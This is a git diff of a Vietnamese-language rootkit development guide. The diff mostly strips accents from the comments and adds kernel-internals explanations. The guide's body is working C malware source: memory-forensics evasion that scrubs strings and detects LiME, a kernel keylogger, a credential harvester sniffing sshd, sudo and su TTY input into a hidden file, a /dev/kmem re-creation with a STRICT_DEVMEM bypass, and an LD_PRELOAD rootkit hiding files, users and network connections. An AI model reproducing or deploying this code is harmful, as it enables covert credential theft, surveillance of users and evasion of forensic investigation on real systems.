@@ -9243,15 +13410,15 @@ bool rk_detect_breakpoints(void)
 ```c
 /* memory_evasion.c — Evade memory forensics tools
  *
- * Memory forensics tools (Volatility, Rekall) dump RAM và analyze:
+ * Memory forensics tools (Volatility, Rekall) dump RAM va analyze:
  *   - Module list traversal (find hidden modules)
  *   - Syscall table verification (detect hooks)
  *   - Process list cross-referencing
  *   - String/signature scanning in memory
  *
  * Evasion techniques:
- *   1. Clear sensitive strings từ module memory
- *   2. Relocate code ngoài module address range
+ *   1. Clear sensitive strings tu module memory
+ *   2. Relocate code ngoai module address range
  *   3. Manipulate module metadata structures
  *   4. Clear freed slab caches (destroy forensic artifacts)
  *   5. Detect LiME (memory dump tool) loading
@@ -9262,24 +13429,24 @@ bool rk_detect_breakpoints(void)
 #include <linux/slab.h>
 
 /* ══════════════════════════════════════════════════════════════
- * Technique 1: Scrub strings từ module memory
+ * Technique 1: Scrub strings tu module memory
  *
- * Volatility signature scan tìm strings: "rootkit", "hidden",
+ * Volatility signature scan tim strings: "rootkit", "hidden",
  * "sys_call_table", magic values, etc.
  *
- * Sau khi init xong: zero out strings không còn cần.
- * Giữ lại function pointers (code vẫn cần).
+ * Sau khi init xong: zero out strings khong con can.
+ * Giu lai function pointers (code van can).
  * ══════════════════════════════════════════════════════════════ */
 static void rk_scrub_module_strings(void)
 {
-    /* Module .rodata section chứa string literals.
+    /* Module .rodata section chua string literals.
      *
      * THIS_MODULE->core_layout.base = module start
      * THIS_MODULE->core_layout.ro_size = read-only section size
      *   (includes .text + .rodata)
      * THIS_MODULE->core_layout.text_size = .text only
      *
-     * .rodata nằm từ text_size → ro_size.
+     * .rodata nam tu text_size -> ro_size.
      */
     unsigned long rodata_start =
         (unsigned long)THIS_MODULE->core_layout.base +
@@ -9292,8 +13459,8 @@ static void rk_scrub_module_strings(void)
     set_memory_rw(rodata_start & PAGE_MASK,
                    (rodata_size >> PAGE_SHIFT) + 1);
 
-    /* Zero specific patterns — NOT toàn bộ (sẽ crash vì
-     * một số strings vẫn được reference). */
+    /* Zero specific patterns — NOT toan bo (se crash vi
+     * mot so strings van duoc reference). */
     char *scan = (char *)rodata_start;
     unsigned long i;
     for (i = 0; i < rodata_size - 8; i++) {
@@ -9310,29 +13477,29 @@ static void rk_scrub_module_strings(void)
 }
 
 /* ══════════════════════════════════════════════════════════════
- * Technique 2: Relocate hook handlers ngoài module range
+ * Technique 2: Relocate hook handlers ngoai module range
  *
- * Volatility kiểm tra: "does syscall table entry point INTO
+ * Volatility kiem tra: "does syscall table entry point INTO
  * a known module address range?"
- * Nếu entry trỏ vào module range → flagged.
- * Nếu entry trỏ vào vmalloc range mà KHÔNG thuộc module → stealth.
+ * Neu entry tro vao module range -> flagged.
+ * Neu entry tro vao vmalloc range ma KHONG thuoc module -> stealth.
  *
- * Copy hook function code vào vmalloc'd executable memory.
- * Syscall table entry trỏ tới vmalloc region.
- * Volatility thấy entry trỏ ra ngoài module list → confused.
+ * Copy hook function code vao vmalloc'd executable memory.
+ * Syscall table entry tro toi vmalloc region.
+ * Volatility thay entry tro ra ngoai module list -> confused.
  * ══════════════════════════════════════════════════════════════ */
 static void *rk_relocate_handler(void *original_handler,
                                    unsigned int handler_size)
 {
     void *relocated;
 
-    /* Allocate executable memory NGOÀI module range.
+    /* Allocate executable memory NGOAI module range.
      *
-     * __vmalloc: allocate với specific flags.
+     * __vmalloc: allocate voi specific flags.
      * PAGE_KERNEL_EXEC: readable + writable + executable.
      *
-     * Memory nằm trong vmalloc range (0xffffc90000000000...)
-     * nhưng KHÔNG thuộc bất kỳ module nào.
+     * Memory nam trong vmalloc range (0xffffc90000000000...)
+     * nhung KHONG thuoc bat ky module nao.
      */
     relocated = __vmalloc(handler_size, GFP_KERNEL);
     if (!relocated) return NULL;
@@ -9351,10 +13518,10 @@ static void *rk_relocate_handler(void *original_handler,
  * Technique 3: Detect LiME module loading
  *
  * LiME (Linux Memory Extractor) = kernel module dump RAM.
- * Nếu LiME load → analyst đang acquire memory dump.
+ * Neu LiME load -> analyst dang acquire memory dump.
  *
  * Detection: monitor module loading events.
- * Response: cleanup sensitive data TRƯỚC dump hoàn thành.
+ * Response: cleanup sensitive data TRUOC dump hoan thanh.
  * ══════════════════════════════════════════════════════════════ */
 static int rk_module_notify(struct notifier_block *nb,
                               unsigned long action, void *data)
@@ -9362,7 +13529,7 @@ static int rk_module_notify(struct notifier_block *nb,
     struct module *mod = data;
 
     if (action == MODULE_STATE_COMING) {
-        /* Module đang load. Check tên. */
+        /* Module dang load. Check ten. */
         if (strstr(mod->name, "lime") ||
             strstr(mod->name, "avml") ||
             strstr(mod->name, "pmem") ||
@@ -9393,6 +13560,24 @@ static struct notifier_block rk_mod_nb = {
 
 ### G.1 Keylogger
 
+**Deep Kernel Internals: Keyboard Input Path trong Linux Kernel**
+
+Keyboard input di qua nhieu layers truoc khi den userspace:
+
+```
+Hardware IRQ (IRQ 1) -> atkbd driver -> input_event()
+  -> keyboard input handler -> kbd_event() -> kbd_keycode()
+    -> keyboard notifier chain (day la noi rootkit hook)
+
+Notifier types khi keyboard event fire:
+  KBD_KEYCODE        — raw scancode tu hardware (chua qua keymap)
+  KBD_UNBOUND_KEYCODE — scancode khong co mapping trong keymap
+  KBD_UNICODE         — Unicode character (sau khi compose/dead key processing)
+  KBD_KEYSYM          — translated keysym (sau keymap lookup, SAU shift/capslock)
+```
+
+Rootkit hook `KBD_KEYSYM` vi `param->value` la gia tri character cuoi cung sau tat ca translation. Voi printable ASCII range (0x20-0x7E), keysym value = ASCII code truc tiep — vi du keysym 0x41 = 'A', 0x61 = 'a'. Keyboard notifier chay trong **interrupt context** (hardirq), nen khong the goi file I/O truc tiep — phai dung workqueue de defer viec ghi file.
+
 ```c
 /* keylogger.c — Kernel-level keyboard input interception
  *
@@ -9400,11 +13585,11 @@ static struct notifier_block rk_mod_nb = {
  *   A) Input subsystem handler (input_register_handler)
  *   B) TTY layer hook (tty_operations read/write)
  *
- * Method A ưu tiên vì:
+ * Method A uu tien vi:
  *   - Capture ALL keyboard input (including passwords, SSH)
- *   - Có keycodes trước mọi userspace processing
- *   - Kernel API chính thức, stable across versions
- *   - Hoạt động cho cả virtual terminals và X11/Wayland
+ *   - Co keycodes truoc moi userspace processing
+ *   - Kernel API chinh thuc, stable across versions
+ *   - Hoat dong cho ca virtual terminals va X11/Wayland
  */
 
 #include "rootkit.h"
@@ -9415,18 +13600,18 @@ static struct notifier_block rk_mod_nb = {
  * Method A: Keyboard notifier
  *
  * Linux input subsystem:
- *   Hardware (keyboard) → input_dev → input_handler → userspace
+ *   Hardware (keyboard) -> input_dev -> input_handler -> userspace
  *
- * register_keyboard_notifier: API nhận mọi keyboard events.
- * Simpler than input_handler — chỉ cho keyboard, không cần
+ * register_keyboard_notifier: API nhan moi keyboard events.
+ * Simpler than input_handler — chi cho keyboard, khong can
  * match input devices.
  *
  * Key event types:
  *   KBD_KEYSYM = translated keysym value
  *   KBD_KEYCODE = raw scancode
  *
- * Dùng KBD_KEYSYM vì param->value = Unicode/ASCII keysym value
- * trực tiếp. Cho printable ASCII (0x20-0x7E), keysym = ASCII code.
+ * Dung KBD_KEYSYM vi param->value = Unicode/ASCII keysym value
+ * truc tiep. Cho printable ASCII (0x20-0x7E), keysym = ASCII code.
  * ══════════════════════════════════════════════════════════════ */
 
 #define LOG_BUF_SIZE 4096
@@ -9434,9 +13619,9 @@ static char key_buf[LOG_BUF_SIZE];
 static int key_buf_pos = 0;
 static DEFINE_SPINLOCK(key_lock);
 
-/* Deferred write buffer — keyboard notifier chạy trong interrupt context,
- * không thể gọi filp_open/kernel_write trực tiếp.
- * Copy vào deferred buffer → workqueue ghi file. */
+/* Deferred write buffer — keyboard notifier chay trong interrupt context,
+ * khong the goi filp_open/kernel_write truc tiep.
+ * Copy vao deferred buffer -> workqueue ghi file. */
 static char deferred_buf[LOG_BUF_SIZE];
 static int deferred_len = 0;
 static DEFINE_SPINLOCK(defer_lock);
@@ -9444,7 +13629,7 @@ static DEFINE_SPINLOCK(defer_lock);
 static void keylog_work_fn(struct work_struct *work);
 static DECLARE_WORK(keylog_work, keylog_work_fn);
 
-/* ── Keyboard notifier callback ── */
+/* -- Keyboard notifier callback -- */
 static int rk_keyboard_notify(struct notifier_block *nb,
                                 unsigned long action, void *data)
 {
@@ -9478,7 +13663,7 @@ static int rk_keyboard_notify(struct notifier_block *nb,
         key_buf[key_buf_pos++] = ch;
     spin_unlock(&key_lock);
 
-    /* Flush buffer khi full hoặc ENTER pressed */
+    /* Flush buffer khi full hoac ENTER pressed */
     if (key_buf_pos > LOG_BUF_SIZE - 64 || ch == '\n') {
         spin_lock(&defer_lock);
         memcpy(deferred_buf, key_buf, key_buf_pos);
@@ -9495,11 +13680,11 @@ static struct notifier_block rk_kb_nb = {
     .notifier_call = rk_keyboard_notify,
 };
 
-/* ── Workqueue handler: copy buffer under lock, then write ──
+/* -- Workqueue handler: copy buffer under lock, then write --
  *
- * Keyboard notifier chạy trong interrupt context.
- * Workqueue chạy trong process context → có thể gọi file I/O.
- * Copy deferred_buf to local buffer dưới spin_lock trước khi write.
+ * Keyboard notifier chay trong interrupt context.
+ * Workqueue chay trong process context -> co the goi file I/O.
+ * Copy deferred_buf to local buffer duoi spin_lock truoc khi write.
  */
 static void keylog_work_fn(struct work_struct *work)
 {
@@ -9507,7 +13692,7 @@ static void keylog_work_fn(struct work_struct *work)
     char local_buf[LOG_BUF_SIZE];
     int local_len;
 
-    /* Copy under lock — tránh race với keyboard notifier */
+    /* Copy under lock — tranh race voi keyboard notifier */
     spin_lock(&defer_lock);
     if (deferred_len <= 0) {
         spin_unlock(&defer_lock);
@@ -9539,14 +13724,14 @@ static void keylog_work_fn(struct work_struct *work)
 /* cred_harvest.c — Intercept authentication credentials
  *
  * Target functions:
- *   1. pam_authenticate → PAM-based auth (SSH, sudo, login, su)
- *   2. unix_verify_password → /etc/shadow password check
- *   3. crypto hash compare → generic credential check
+ *   1. pam_authenticate -> PAM-based auth (SSH, sudo, login, su)
+ *   2. unix_verify_password -> /etc/shadow password check
+ *   3. crypto hash compare -> generic credential check
  *
  * Approach: Kprobe on authentication functions, extract
- * username + password TRƯỚC hash/verify.
+ * username + password TRUOC hash/verify.
  *
- * APT relevance: mọi APT kit thu thập credentials.
+ * APT relevance: moi APT kit thu thap credentials.
  * Credentials = lateral movement capability.
  */
 
@@ -9555,7 +13740,7 @@ static void keylog_work_fn(struct work_struct *work)
 
 #define CRED_LOG_PATH "/tmp/.rk_creds"
 
-/* ── Log captured credential ── */
+/* -- Log captured credential -- */
 static void rk_log_credential(const char *source,
                                 const char *username,
                                 const char *password)
@@ -9578,22 +13763,22 @@ static void rk_log_credential(const char *source,
 /* ══════════════════════════════════════════════════════════════
  * Method 1: Hook sys_openat cho /etc/shadow reads
  *
- * Khi PAM authenticate: nó read /etc/shadow.
- * Detect: monitor openat() cho /etc/shadow → log calling process.
- * Không capture password trực tiếp nhưng identify auth attempts.
+ * Khi PAM authenticate: no read /etc/shadow.
+ * Detect: monitor openat() cho /etc/shadow -> log calling process.
+ * Khong capture password truc tiep nhung identify auth attempts.
  * ══════════════════════════════════════════════════════════════ */
 
 /* ══════════════════════════════════════════════════════════════
- * Method 2: TTY sniffing via kretprobe — Capture password từ SSH/sudo
+ * Method 2: TTY sniffing via kretprobe — Capture password tu SSH/sudo
  *
  * Khi user type password (SSH login, sudo prompt):
  *   1. Terminal echo disabled (ICANON off, ECHO off)
- *   2. User type password → chars go through tty_operations
- *   3. tty->ops->write() ghi chars vào tty buffer
- *   4. Process read() từ tty fd
+ *   2. User type password -> chars go through tty_operations
+ *   3. tty->ops->write() ghi chars vao tty buffer
+ *   4. Process read() tu tty fd
  *
- * Hook tty_read via kretprobe: capture chars TRƯỚC process đọc.
- * Detect password input: TTY echo off → likely password prompt.
+ * Hook tty_read via kretprobe: capture chars TRUOC process doc.
+ * Detect password input: TTY echo off -> likely password prompt.
  *
  * tty_read signature changed at kernel 5.10:
  *   Kernel < 5.10:
@@ -9602,7 +13787,7 @@ static void rk_log_credential(const char *source,
  *   Kernel >= 5.10:
  *     ssize_t tty_read(struct kiocb *iocb, struct iov_iter *to)
  *
- * Dùng kretprobe approach để tránh signature issues.
+ * Dung kretprobe approach de tranh signature issues.
  * Entry handler save buffer pointer, return handler capture data.
  * ══════════════════════════════════════════════════════════════ */
 
@@ -9650,8 +13835,8 @@ static int tty_read_return(struct kretprobe_instance *ri,
     kern_buf[copy_len] = '\0';
 
     /* Log captured input — check for password patterns.
-     * Nếu echo disabled trên TTY = password entry.
-     * Tích hợp với rk_log_credential() để log. */
+     * Neu echo disabled tren TTY = password entry.
+     * Tich hop voi rk_log_credential() de log. */
     rk_log_credential("tty_sniff", current->comm, kern_buf);
 
     return 0;
@@ -9668,18 +13853,18 @@ static int tty_read_return(struct kretprobe_instance *ri,
  */
 
 /* ══════════════════════════════════════════════════════════════
- * Method 3: Kprobe trên specific auth functions
+ * Method 3: Kprobe tren specific auth functions
  *
- * Hook internal functions gọi khi authenticate:
+ * Hook internal functions goi khi authenticate:
  *   - vfs_read on /etc/shadow
  *   - Hook process execution of sshd, sudo, su
  *
- * Khi sshd process đang chạy + read from tty → capture.
+ * Khi sshd process dang chay + read from tty -> capture.
  * ══════════════════════════════════════════════════════════════ */
 
 static int ssh_auth_handler(struct kprobe *p, struct pt_regs *regs)
 {
-    /* Check nếu current process là sshd hoặc sudo */
+    /* Check neu current process la sshd hoac sudo */
     if (strcmp(current->comm, "sshd") == 0 ||
         strcmp(current->comm, "sudo") == 0 ||
         strcmp(current->comm, "su") == 0 ||
@@ -9704,23 +13889,23 @@ static struct kprobe auth_kp = {
 ```c
 /* devkmem.c — Access kernel memory qua character devices
  *
- * /dev/mem:  access physical memory (RAM) trực tiếp
- * /dev/kmem: access kernel virtual memory trực tiếp
+ * /dev/mem:  access physical memory (RAM) truc tiep
+ * /dev/kmem: access kernel virtual memory truc tiep
  *
- * Classic technique (pre-module era rootkits dùng):
- *   Open /dev/kmem → seek tới kernel address → read/write
- *   → Modify syscall table, credentials, etc.
+ * Classic technique (pre-module era rootkits dung):
+ *   Open /dev/kmem -> seek toi kernel address -> read/write
+ *   -> Modify syscall table, credentials, etc.
  *
  * Modern kernels:
- *   - /dev/kmem: disabled (CONFIG_DEVKMEM=n) trên hầu hết distros
+ *   - /dev/kmem: disabled (CONFIG_DEVKMEM=n) tren hau het distros
  *   - /dev/mem: restricted (CONFIG_STRICT_DEVMEM=y)
- *     chỉ cho access <1MB (BIOS area) và PCI MMIO regions
+ *     chi cho access <1MB (BIOS area) va PCI MMIO regions
  *   - Kernel lockdown: block /dev/mem completely
  *
- * Rootkit có thể:
+ * Rootkit co the:
  *   1. Re-enable /dev/kmem (create device node, bypass restriction)
- *   2. Disable CONFIG_STRICT_DEVMEM check tại runtime
- *   3. Dùng /dev/mem + bypass STRICT_DEVMEM
+ *   2. Disable CONFIG_STRICT_DEVMEM check tai runtime
+ *   3. Dung /dev/mem + bypass STRICT_DEVMEM
  *
  * Used by: classic rootkits (SucKIT), modern rootkits for
  *          reading kernel memory without standard APIs.
@@ -9733,11 +13918,11 @@ static struct kprobe auth_kp = {
 /* ══════════════════════════════════════════════════════════════
  * Method 1: Read/Write kernel memory qua /dev/mem
  *
- * Physical memory access — bypass nhiều protections.
- * Cần convert virtual address → physical address trước.
+ * Physical memory access — bypass nhieu protections.
+ * Can convert virtual address -> physical address truoc.
  * ══════════════════════════════════════════════════════════════ */
 
-/* ── Virtual → Physical address conversion ── */
+/* -- Virtual -> Physical address conversion -- */
 static phys_addr_t rk_virt_to_phys(unsigned long vaddr)
 {
     pgd_t *pgd;
@@ -9746,7 +13931,7 @@ static phys_addr_t rk_virt_to_phys(unsigned long vaddr)
     pmd_t *pmd;
     pte_t *pte;
 
-    /* Walk page tables: PGD → P4D → PUD → PMD → PTE → physical */
+    /* Walk page tables: PGD -> P4D -> PUD -> PMD -> PTE -> physical */
     pgd = pgd_offset(current->mm ? current->mm : &init_mm, vaddr);
     if (pgd_none(*pgd)) return 0;
 
@@ -9773,11 +13958,11 @@ static phys_addr_t rk_virt_to_phys(unsigned long vaddr)
     return (pte_pfn(*pte) << PAGE_SHIFT) | (vaddr & ~PAGE_MASK);
 }
 
-/* ── Read kernel memory qua physical mapping ──
+/* -- Read kernel memory qua physical mapping --
  *
- * ioremap: map physical address vào kernel virtual address space.
- * Thường dùng cho MMIO (hardware registers).
- * Nhưng có thể map bất kỳ physical address nào — including RAM.
+ * ioremap: map physical address vao kernel virtual address space.
+ * Thuong dung cho MMIO (hardware registers).
+ * Nhung co the map bat ky physical address nao — including RAM.
  */
 static int rk_read_phys(phys_addr_t phys_addr, void *buf, size_t len)
 {
@@ -9807,11 +13992,11 @@ static int rk_write_phys(phys_addr_t phys_addr, const void *buf, size_t len)
  * Method 2: Bypass STRICT_DEVMEM
  *
  * CONFIG_STRICT_DEVMEM: devmem_is_allowed() check.
- * Nếu return 0 → access denied.
- * Nếu return 1 → access allowed.
+ * Neu return 0 -> access denied.
+ * Neu return 1 -> access allowed.
  *
- * Rootkit có thể:
- *   a) Hook devmem_is_allowed() → always return 1
+ * Rootkit co the:
+ *   a) Hook devmem_is_allowed() -> always return 1
  *   b) Modify variable directly
  * ══════════════════════════════════════════════════════════════ */
 static int (*orig_devmem_is_allowed)(unsigned long pfn);
@@ -9821,14 +14006,14 @@ static int rk_devmem_is_allowed(unsigned long pfn)
     return 1;  /* Always allow — bypass STRICT_DEVMEM */
 }
 
-/* Install via ftrace hook trên devmem_is_allowed */
+/* Install via ftrace hook tren devmem_is_allowed */
 
 /* ══════════════════════════════════════════════════════════════
  * Method 3: Re-create /dev/kmem
  *
- * Nếu /dev/kmem không tồn tại (CONFIG_DEVKMEM=n),
- * rootkit có thể tạo character device thay thế
- * với custom file_operations cho phép read/write kernel memory.
+ * Neu /dev/kmem khong ton tai (CONFIG_DEVKMEM=n),
+ * rootkit co the tao character device thay the
+ * voi custom file_operations cho phep read/write kernel memory.
  * ══════════════════════════════════════════════════════════════ */
 
 static ssize_t rk_kmem_read(struct file *file, char __user *buf,
@@ -9844,7 +14029,7 @@ static ssize_t rk_kmem_read(struct file *file, char __user *buf,
     kern_buf = kzalloc(count, GFP_KERNEL);
     if (!kern_buf) return -ENOMEM;
 
-    /* Direct copy từ kernel address */
+    /* Direct copy tu kernel address */
     if (copy_from_kernel_nofault(kern_buf, (void *)kaddr, count)) {
         kfree(kern_buf);
         return -EFAULT;
@@ -9894,7 +14079,7 @@ static const struct file_operations rk_kmem_fops = {
     .llseek = default_llseek,
 };
 
-/* Đăng ký misc device tên disguised (không đặt tên "kmem"):
+/* Dang ky misc device ten disguised (khong dat ten "kmem"):
  *
  * static struct miscdevice rk_kmem_dev = {
  *     .minor = MISC_DYNAMIC_MINOR,
@@ -9914,6 +14099,20 @@ static const struct file_operations rk_kmem_fops = {
 
 ### H.1 LD_PRELOAD Rootkit — Shared library injection {#ld-preload}
 
+**Deep Kernel Internals: Dynamic Linker va Symbol Resolution**
+
+Khi execute mot ELF binary, kernel goi dynamic linker (`ld-linux-x86-64.so.2`, con goi la `ld.so`). Dynamic linker load shared libraries theo thu tu uu tien:
+
+```
+1. LD_PRELOAD env var (hoac /etc/ld.so.preload file)  <- HIGHEST priority
+2. DT_NEEDED entries tu ELF binary headers            <- libraries binary yeu cau
+3. Default search paths (/lib, /usr/lib, ldconfig cache)
+```
+
+Symbol resolution dung **first-match-wins**: khi binary goi `readdir()`, linker tim symbol "readdir" theo thu tu load. Neu LD_PRELOAD library define `readdir()`, no duoc tim thay TRUOC libc's `readdir()` va duoc su dung thay the.
+
+`dlsym(RTLD_NEXT, "readdir")`: tim dinh nghia KE TIEP cua "readdir" trong load order — tuc la bo qua library hien tai (LD_PRELOAD library) va tra ve pointer toi libc's original `readdir()`. Day la cach goi original function tu trong hook.
+
 ```c
 /* ld_preload_rootkit.c — Userspace rootkit via shared library
  *
@@ -9921,24 +14120,24 @@ static const struct file_operations rk_kmem_fops = {
  * INSTALL: echo '/path/to/librk.so' > /etc/ld.so.preload
  *
  * Mechanism:
- *   /etc/ld.so.preload liệt kê shared libraries load TRƯỚC mọi thứ.
- *   Dynamic linker (ld-linux.so) đọc file này → load librk.so
- *   → MỌI process mới chạy đều load librk.so.
- *   → Hàm trong librk.so override hàm trong libc (symbol interposition).
+ *   /etc/ld.so.preload liet ke shared libraries load TRUOC moi thu.
+ *   Dynamic linker (ld-linux.so) doc file nay -> load librk.so
+ *   -> MOI process moi chay deu load librk.so.
+ *   -> Ham trong librk.so override ham trong libc (symbol interposition).
  *
- * Ưu điểm so với kernel rootkit:
- *   - Không cần root để develop/test
- *   - Không cần kernel headers
- *   - Không crash kernel nếu bug
- *   - Hoạt động trên mọi kernel version
+ * Uu diem so voi kernel rootkit:
+ *   - Khong can root de develop/test
+ *   - Khong can kernel headers
+ *   - Khong crash kernel neu bug
+ *   - Hoat dong tren moi kernel version
  *
- * Nhược điểm:
- *   - Chỉ affect userspace (kernel tools bypass)
- *   - Static-linked binaries không bị affect
- *   - Dễ detect hơn (strace, ltrace, ld.so.preload check)
+ * Nhuoc diem:
+ *   - Chi affect userspace (kernel tools bypass)
+ *   - Static-linked binaries khong bi affect
+ *   - De detect hon (strace, ltrace, ld.so.preload check)
  *
  * Used by: Azazel, Jynx2, libprocesshider, Umbreon.
- * Kết hợp kernel + userspace rootkit = defense-in-depth.
+ * Ket hop kernel + userspace rootkit = defense-in-depth.
  */
 
 #define _GNU_SOURCE
@@ -9957,20 +14156,20 @@ static const struct file_operations rk_kmem_fops = {
 #define HIDDEN_USER   "rk_user"
 
 /* ══════════════════════════════════════════════════════════════
- * Hook readdir / readdir64 — Ẩn files và processes
+ * Hook readdir / readdir64 — An files va processes
  *
- * ls, find, python os.listdir() đều gọi readdir().
- * Override readdir → filter entries có tên bắt đầu HIDDEN_PREFIX.
+ * ls, find, python os.listdir() deu goi readdir().
+ * Override readdir -> filter entries co ten bat dau HIDDEN_PREFIX.
  *
  * dlsym(RTLD_NEXT, "readdir"):
- *   Lấy pointer tới ORIGINAL readdir trong libc.
- *   RTLD_NEXT = "tìm symbol ở library KẾ TIẾP trong load order"
- *   → skip librk.so → tìm trong libc.so.
+ *   Lay pointer toi ORIGINAL readdir trong libc.
+ *   RTLD_NEXT = "tim symbol o library KE TIEP trong load order"
+ *   -> skip librk.so -> tim trong libc.so.
  * ══════════════════════════════════════════════════════════════ */
 
 struct dirent *readdir(DIR *dirp)
 {
-    /* Lấy original readdir từ libc */
+    /* Lay original readdir tu libc */
     static struct dirent *(*orig_readdir)(DIR *) = NULL;
     if (!orig_readdir)
         orig_readdir = dlsym(RTLD_NEXT, "readdir");
@@ -9978,13 +14177,13 @@ struct dirent *readdir(DIR *dirp)
     struct dirent *entry;
 
     while ((entry = orig_readdir(dirp)) != NULL) {
-        /* Filter: skip entries bắt đầu bằng HIDDEN_PREFIX */
+        /* Filter: skip entries bat dau bang HIDDEN_PREFIX */
         if (strncmp(entry->d_name, HIDDEN_PREFIX,
                     strlen(HIDDEN_PREFIX)) == 0)
             continue;
 
         /* Filter: skip hidden PIDs (numeric entries trong /proc) */
-        /* (cần track hidden PIDs via shared memory hoặc file) */
+        /* (can track hidden PIDs via shared memory hoac file) */
 
         return entry;  /* Visible entry */
     }
@@ -9992,7 +14191,7 @@ struct dirent *readdir(DIR *dirp)
     return NULL;  /* End of directory */
 }
 
-/* readdir64 — 64-bit version, cần hook cả 2 */
+/* readdir64 — 64-bit version, can hook ca 2 */
 struct dirent64 *readdir64(DIR *dirp)
 {
     static struct dirent64 *(*orig)(DIR *) = NULL;
@@ -10011,15 +14210,15 @@ struct dirent64 *readdir64(DIR *dirp)
 /* ══════════════════════════════════════════════════════════════
  * Hook stat / lstat / access — File existence check
  *
- * Chương trình check file existence:
- *   stat("rk_config", &buf) → -1 ENOENT = "file không tồn tại"
+ * Chuong trinh check file existence:
+ *   stat("rk_config", &buf) -> -1 ENOENT = "file khong ton tai"
  *
- * Nếu chỉ hook readdir mà không hook stat:
- *   ls → không thấy file (readdir filtered)
- *   cat rk_config → VẪN ĐỌC ĐƯỢC (stat + open work)
- *   → Inconsistency = suspicious
+ * Neu chi hook readdir ma khong hook stat:
+ *   ls -> khong thay file (readdir filtered)
+ *   cat rk_config -> VAN DOC DUOC (stat + open work)
+ *   -> Inconsistency = suspicious
  *
- * Hook stat/lstat/access để trả ENOENT cho hidden files.
+ * Hook stat/lstat/access de tra ENOENT cho hidden files.
  * ══════════════════════════════════════════════════════════════ */
 
 int stat(const char *pathname, struct stat *statbuf)
@@ -10056,10 +14255,10 @@ int lstat(const char *pathname, struct stat *statbuf)
 /* ══════════════════════════════════════════════════════════════
  * Hook fopen — Block reading hidden files + track /proc/net/tcp
  *
- * Kết hợp 2 chức năng:
- *   1. Block fopen cho files có HIDDEN_PREFIX (ẩn file)
- *   2. Track FILE* pointer cho /proc/net/tcp và /proc/net/tcp6
- *      → dùng trong fgets hook để chỉ filter đúng stream
+ * Ket hop 2 chuc nang:
+ *   1. Block fopen cho files co HIDDEN_PREFIX (an file)
+ *   2. Track FILE* pointer cho /proc/net/tcp va /proc/net/tcp6
+ *      -> dung trong fgets hook de chi filter dung stream
  * ══════════════════════════════════════════════════════════════ */
 
 static FILE *proc_tcp_fp = NULL;
@@ -10092,13 +14291,13 @@ FILE *fopen(const char *pathname, const char *mode)
 }
 
 /* ══════════════════════════════════════════════════════════════
- * Hook fgets — Ẩn connections CHỈ trong /proc/net/tcp
+ * Hook fgets — An connections CHI trong /proc/net/tcp
  *
- * netstat, ss đọc /proc/net/tcp. Filter output chứa hidden port.
+ * netstat, ss doc /proc/net/tcp. Filter output chua hidden port.
  *
- * CHỈ filter khi stream là /proc/net/tcp hoặc /proc/net/tcp6
- * (tracked bởi fopen hook ở trên). Không filter files khác —
- * tránh bug ẩn dòng trong log files, config files, v.v.
+ * CHI filter khi stream la /proc/net/tcp hoac /proc/net/tcp6
+ * (tracked boi fopen hook o tren). Khong filter files khac —
+ * tranh bug an dong trong log files, config files, v.v.
  * ══════════════════════════════════════════════════════════════ */
 
 char *fgets(char *s, int size, FILE *stream)
@@ -10126,7 +14325,7 @@ char *fgets(char *s, int size, FILE *stream)
 }
 
 /* ══════════════════════════════════════════════════════════════
- * Hook getpwnam / getpwent — Ẩn user
+ * Hook getpwnam / getpwent — An user
  * ══════════════════════════════════════════════════════════════ */
 
 struct passwd *getpwnam(const char *name)
@@ -10136,7 +14335,7 @@ struct passwd *getpwnam(const char *name)
 
     if (strcmp(name, HIDDEN_USER) == 0) {
         errno = ENOENT;
-        return NULL;  /* User "không tồn tại" */
+        return NULL;  /* User "khong ton tai" */
     }
     return orig(name);
 }
@@ -10160,33 +14359,57 @@ struct passwd *getpwent(void)
 
 ### H.2 GOT/PLT Hooking — Full implementation {#got-plt}
 
+**Deep Kernel Internals: ELF Lazy Binding va GOT/PLT Mechanism**
+
+Khi ELF binary goi mot shared library function (vd `printf()`), no khong goi truc tiep ma di qua 2 bang trung gian:
+
+```
+Lazy binding flow (lan goi dau tien):
+  1. Binary: CALL printf@PLT         -> jump toi PLT stub
+  2. PLT stub: JMP *[GOT[n]]         -> lan dau GOT[n] tro nguoc lai PLT
+  3. PLT: PUSH relocation_index      -> push index cua symbol trong .rela.plt
+  4. JMP dynamic_resolver            -> goi ld.so resolver
+  5. ld.so: resolve "printf" -> tim dia chi that trong libc
+  6. ld.so: ghi dia chi that vao GOT[n]
+  7. ld.so: jump toi printf that
+
+Cac lan goi tiep theo:
+  1. Binary: CALL printf@PLT         -> jump toi PLT stub
+  2. PLT stub: JMP *[GOT[n]]         -> GOT[n] da co dia chi that
+  3. -> nhay thang toi printf trong libc (khong qua resolver nua)
+```
+
+GOT hooking: ghi de GOT entry bang dia chi function cua attacker. Moi lan binary goi function qua PLT, no se nhay toi hook thay vi original. Chi anh huong binary cu the (khong global nhu LD_PRELOAD).
+
+Luu y: FULL RELRO (RELocation Read-Only) protection map GOT thanh read-only SAU khi resolve xong tat ca symbols — can `mprotect()` de ghi de.
+
 ```c
 /* got_plt_hook.c — Userspace GOT/PLT hooking
  *
  * GOT (Global Offset Table):
- *   Mỗi shared library function gọi qua PLT → GOT.
- *   GOT chứa RUNTIME ADDRESS của function trong libc.
+ *   Moi shared library function goi qua PLT -> GOT.
+ *   GOT chua RUNTIME ADDRESS cua function trong libc.
  *   
- *   printf@plt → GOT[printf] → libc printf address
+ *   printf@plt -> GOT[printf] -> libc printf address
  *
- *   Thay GOT entry = redirect tất cả calls tới function đó.
+ *   Thay GOT entry = redirect tat ca calls toi function do.
  *
- * So sánh LD_PRELOAD:
- *   LD_PRELOAD: override tại symbol resolution time (load-time)
- *   GOT/PLT:    override tại runtime, SAU KHI binary đã load
- *               → có thể hook specific binary, không global
+ * So sanh LD_PRELOAD:
+ *   LD_PRELOAD: override tai symbol resolution time (load-time)
+ *   GOT/PLT:    override tai runtime, SAU KHI binary da load
+ *               -> co the hook specific binary, khong global
  *
- * Ưu điểm:
- *   - Selective: chỉ hook 1 binary, không affect tất cả processes
- *   - Runtime: hook/unhook lúc nào cũng được
- *   - Không cần ld.so.preload (ít indicator hơn)
+ * Uu diem:
+ *   - Selective: chi hook 1 binary, khong affect tat ca processes
+ *   - Runtime: hook/unhook luc nao cung duoc
+ *   - Khong can ld.so.preload (it indicator hon)
  *
- * Nhược điểm:
- *   - Phải parse ELF headers runtime
- *   - RELRO (RELocation Read-Only) protection ngăn write GOT
- *   - Cần ptrace hoặc /proc/PID/mem access
+ * Nhuoc diem:
+ *   - Phai parse ELF headers runtime
